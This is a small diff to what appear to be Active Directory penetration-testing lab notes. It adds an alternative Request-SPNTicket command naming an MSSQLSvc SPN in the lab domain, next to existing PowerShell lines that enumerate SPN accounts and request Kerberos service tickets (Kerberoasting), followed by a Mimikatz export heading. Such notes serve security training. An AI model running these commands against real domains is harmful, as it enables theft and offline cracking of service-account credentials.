@@ -753,9 +753,9 @@ Get-NetUser -SPN
 Add-Type -AssemblyName System.IdentityModel
 New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local"
 ```
-
+or
 ```
-Request-SPNTicket 
+Request-SPNTicket "MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local"
 ```
 
 #### Export ticket using Mimikatz
